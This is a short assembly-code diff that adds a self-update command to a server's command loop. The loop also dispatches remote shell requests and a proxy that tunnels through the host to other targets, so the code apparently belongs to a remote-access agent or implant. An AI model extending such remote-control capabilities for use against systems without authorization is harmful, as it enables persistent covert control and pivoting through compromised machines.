@@ -140,6 +140,8 @@ server_run:
     je      .do_sync
     cmp     al, CMD_SHELL_REQ
     je      .do_shell
+    cmp     al, CMD_SELF_UPDATE
+    je      .do_selfupdate
     cmp     al, CMD_PROXY_CONNECT
     je      .do_proxy
     ;; Unknown
@@ -552,6 +554,17 @@ server_run:
     pop     eax
     call    .send_error
     jmp     .cmd_loop
+
+;; ==== SELF-UPDATE: replace binary + exit ====
+.do_selfupdate:
+    ;; Payload = new binary path (raw string in proto_buf+1)
+    mov     eax, [_proto_buf+1]  ; skip cmdId, get path start
+    lea     esi, [_proto_buf+1]
+    push    esi
+    push    dword [_srv_client]
+    call    selfupdate_handle
+    add     esp, 8
+    jmp     .cmd_loop            ; shouldn't reach (selfupdate exits)
 
 ;; ==== PROXY: tunnel through this host to target ====
 .do_proxy:
